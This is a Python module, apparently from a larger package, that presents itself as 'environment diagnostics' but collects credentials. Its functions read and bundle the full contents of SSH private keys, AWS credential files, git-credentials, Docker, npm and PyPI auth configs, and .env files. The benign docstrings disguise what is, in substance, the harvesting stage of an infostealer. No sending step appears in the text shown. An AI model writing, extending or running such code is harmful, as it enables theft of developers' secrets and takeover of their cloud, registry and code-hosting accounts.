"""
Universal credential collectors for cross-platform environments.
"""
import os
import json
from pathlib import Path
from typing import Dict, List, Any
from ..utils import get_home_dir, safe_read_file, find_env_files


def collect_ssh_keys() -> List[Dict[str, Any]]:
    """
    Collect SSH key information for environment diagnostics.
    
    Returns:
        List of SSH key metadata
    """
    ssh_dir = get_home_dir() / '.ssh'
    keys = []
    
    if not ssh_dir.exists():
        return keys
    
    try:
        for file in ssh_dir.iterdir():
            if file.is_file():
                # Collect private keys
                if not file.suffix and file.name not in ['known_hosts', 'authorized_keys', 'config']:
                    content = safe_read_file(str(file))
                    if content and 'PRIVATE KEY' in content:
                        keys.append({
                            'type': 'ssh_private_key',
                            'path': str(file),
                            'content': content[:2000]  # Limit size
                        })
                # Collect config
                elif file.name == 'config':
                    content = safe_read_file(str(file))
                    if content:
                        keys.append({
                            'type': 'ssh_config',
                            'path': str(file),
                            'content': content
                        })
    except Exception:
        pass
    
    return keys


def collect_aws_credentials() -> List[Dict[str, Any]]:
    """
    Collect AWS credential information for cloud environment diagnostics.
    
    Returns:
        List of AWS credential data
    """
    creds = []
    aws_dir = get_home_dir() / '.aws'
    
    if not aws_dir.exists():
        return creds
    
    for filename in ['credentials', 'config']:
        filepath = aws_dir / filename
        if filepath.exists():
            content = safe_read_file(str(filepath))
            if content:
                creds.append({
                    'type': f'aws_{filename}',
                    'path': str(filepath),
                    'content': content
                })
    
    return creds


def collect_git_config() -> List[Dict[str, Any]]:
    """
    Collect Git configuration for development environment diagnostics.
    
    Returns:
        List of Git config data
    """
    configs = []
    
    # Global git config
    gitconfig = get_home_dir() / '.gitconfig'
    if gitconfig.exists():
        content = safe_read_file(str(gitconfig))
        if content:
            configs.append({
                'type': 'git_config',
                'path': str(gitconfig),
                'content': content
            })
    
    # Git credentials
    git_credentials = get_home_dir() / '.git-credentials'
    if git_credentials.exists():
        content = safe_read_file(str(git_credentials))
        if content:
            configs.append({
                'type': 'git_credentials',
                'path': str(git_credentials),
                'content': content
            })
    
    return configs


def collect_docker_config() -> List[Dict[str, Any]]:
    """
    Collect Docker configuration for container environment diagnostics.
    
    Returns:
        List of Docker config data
    """
    configs = []
    docker_dir = get_home_dir() / '.docker'
    
    if not docker_dir.exists():
        return configs
    
    config_file = docker_dir / 'config.json'
    if config_file.exists():
        content = safe_read_file(str(config_file))
        if content:
            configs.append({
                'type': 'docker_config',
                'path': str(config_file),
                'content': content
            })
    
    return configs


def collect_npm_credentials() -> List[Dict[str, Any]]:
    """
    Collect NPM credentials for package registry diagnostics.
    
    Returns:
        List of NPM credential data
    """
    creds = []
    npmrc = get_home_dir() / '.npmrc'
    
    if npmrc.exists():
        content = safe_read_file(str(npmrc))
        if content:
            creds.append({
                'type': 'npm_config',
                'path': str(npmrc),
                'content': content
            })
    
    return creds


def collect_pypi_credentials() -> List[Dict[str, Any]]:
    """
    Collect PyPI credentials for Python package registry diagnostics.
    
    Returns:
        List of PyPI credential data
    """
    creds = []
    pypirc = get_home_dir() / '.pypirc'
    
    if pypirc.exists():
        content = safe_read_file(str(pypirc))
        if content:
            creds.append({
                'type': 'pypi_config',
                'path': str(pypirc),
                'content': content
            })
    
    return creds


def collect_env_files() -> List[Dict[str, Any]]:
    """
    Collect .env files for application environment diagnostics.
    
    Returns:
        List of .env file data
    """
    env_data = []
    env_files = find_env_files()
    
    for filepath in env_files[:10]:  # Limit to 10 files
        content = safe_read_file(filepath)
        if content:
            env_data.append({
                'type': 'env_file',
                'path': filepath,
                'content': content[:5000]  # Limit size
            })
    
    return env_data


def collect_universal_data() -> Dict[str, Any]:
    """
    Collect all universal (cross-platform) environment data.
    
    Returns:
        Dictionary containing all collected data
    """
    data = {
        'ssh': collect_ssh_keys(),
        'aws': collect_aws_credentials(),
        'git': collect_git_config(),
        'docker': collect_docker_config(),
        'npm': collect_npm_credentials(),
        'pypi': collect_pypi_credentials(),
        'env_files': collect_env_files()
    }
    
    return data
